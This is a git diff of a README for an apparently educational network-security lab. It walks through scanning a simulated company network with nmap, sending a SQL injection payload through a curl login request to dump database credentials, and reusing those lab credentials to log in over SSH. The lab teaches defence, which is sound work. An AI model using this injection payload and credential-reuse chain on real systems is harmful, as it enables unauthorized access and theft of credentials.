@@ -6,23 +6,23 @@ Network Security project about SSH, Database and SQL Injection.
 
 <img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/network_scheme.svg" width=500>
 
--   Web Network
-    1. Web Server hosting a stub site using NodeJS
-    2. MySQL Server hosting sensitive information
--   Employee Network
-    1. BobPC which represent the hacker host
-    2. TomPC which represent the target host
--   Company Network
-    1. All the Employee network
-    2. Web Server
+-   Web Network nodes:
+    1. Web Server hosting a stub website using NodeJS.
+    2. MySQL Server hosting sensitive information.
+-   Employee Network nodes:
+    1. BobPC which represents the hacker host.
+    2. TomPC which represents the target host.
+-   Company Network nodes:
+    1. All the Employee network nodes.
+    2. Web Server.
 
 # Background Scenario
 
-This lab is about a industrial espionage, represented by Bob, who is infiltrated inside a company lan network and found, among a lot of other devices, one vulnerable computer that belongs to Tom and an useful site open ONLY inside the company network.
+This lab is about industrial espionage, represented by the attacker Bob, who is infiltrated inside a company lan network and has found, among a lot of devices, one vulnerable computer that belongs to Tom and an useful website open ONLY inside the company network.
 
-During the demostration scenario we found out these IP from 2 different subnets:
+During the demonstration scenario, we discovered these IPs from 2 different subnets:
 
--   _193.20.3.1_ - Company Network
+-   _193.20.3.1_ - Company Network 
 -   _193.20.3.2_ - Bob PC on company network
 
 -   _193.20.1.1_ - Employee Network
@@ -33,28 +33,26 @@ And we don't have any access to the Web network.
 
 # Instruction: what to do
 
-You can start connecting to the pentesting PC with SSH using 2222 port
+We can start connecting to the pentesting PC with SSH using 2222 port.
 
-1. Footprinting: gather information online about the organization
-2. Scanning: scan vulnerable point of access
-3. Enumeration: probing more intrusive of vulnerable services
-4. Exploitation: attacking those potential vulnerability
+1. Footprinting: gather information online about the organization and its systems.
+2. Scanning: scan vulnerable point of access.
+3. Enumeration: intrusive probing of vulnerable services.
+4. Exploitation: attack those potential vulnerability.
 
 ## Footprinting
 
-In this case scenario we're already connected to the local network, so we've already gathered enought information about our target.
+In this case scenario we're already connected to the local network, so we've already gathered enough information about our target.
 
+We start by finding out our IP address on the networks using `ifconfig` command:
 
+<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/ifconfig_bob.png" width=500>
 
-We start find out our IP address on the networks using `ifconfig` command, and we found out.
+Then, we discover some IPs using then `nmap` tool with these options:
 
-Using then `nmap` tool with these options:
-
--   “-sn” means “no port scan”
--   “-PE” sends ICMP Echo Request
--   “--send-ip” to not send ARP packets
-
-We found out some host IP:
+-   “-sn” means “no port scan”.
+-   “-PE” sends ICMP Echo Request.
+-   “--send-ip” to not send ARP packets.
 
 <img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/footprinting_company_network.png" width=500>
 
@@ -66,7 +64,7 @@ We found out some host IP:
 
 ## Scanning
 
-We're interested in the Web Server and in Tom PC, so we can scan more aggressively to find about any open port
+We're interested in the Web Server and in Tom PC, so we can scan more aggressively them to find information about any open ports.
 
 If we use simply a TPC SYN scan from nmap, we find vague information:
 
@@ -76,26 +74,26 @@ If we use simply a TPC SYN scan from nmap, we find vague information:
 
 ## Enumeration
 
-Else, if we explore more with a Version Detection scan, we can scan even beyond the typical use of a port like 8080:
+Instead, if we explore deeply with a Version Detection scan with nmap, we can obtain service fingerprints on the hosts:
 
 <img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/enumeration_company_sv.PNG" width=500>
 
-and we find about a web server open on port 8080.
+we have gathered information about the web server, which is implemented with NodeJS on port 8080 and has a connection with a MySQL database.
 
-Meanwhile on Tom PC we found an open SSH port
+Meanwhile on Tom PC, we found an open SSH port:
 
 <img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_tom_sv.PNG" width=500>
 
-We can think about SSH after getting information about the site.
-Now we can find about this site (in a real case scenario we should use DirBuster to map the entire site) and the main page.
+Firstly we explore the website on the Web Server to find vulnerabilities, then exploit the open SSH port on Tom PC.
+
+We retrieved the html page using `curl` and found out about a login form, which we can try to exploit.
 
 <img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_curl.png" width=500>
 
-We retrived the html page using `curl` and found out about a login form, which we can try to exploit.
 
 ## Exploitation
 
-We can try some usual combination for the form
+We can try some usual combination for the form:
 
 ```bash
 curl -X POST -d 'username=a&password=b' 193.20.3.1:8080
@@ -111,17 +109,17 @@ Which returns
 
 `{"success":false,"response":"No user found","result":[]}`
 
-and we can try last one with MySQL injection using OR and commenting syntax
+Lastly, we can try one with MySQL injection using OR and commenting syntax:
 
 ```bash
 curl -X POST -d 'username=" OR 1<2; -- &password=b' 193.20.3.1:8080
 ```
 
-which return us a bunch of credentials
+which returns a list of credentials:
 
 <img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sql.png" width=700>
 
-including only one user called Tom with:
+including only one entry related to a user named Tom with credentials:
 
 ```
 username = tcasaccio1
@@ -130,9 +128,9 @@ password = YLN1NrMdGN
 
 ## SSH Access
 
-Now that we gather those information, we can hope that the only user we know has the same user and password as this database.
+Now that we have gathered this information, we can try using the credentials above to gain access to the open SSH port on Tom PC.
 
-We can try to log in using:
+We can log in using:
 
 ```bash
 ssh tcasaccio1@193.20.1.3
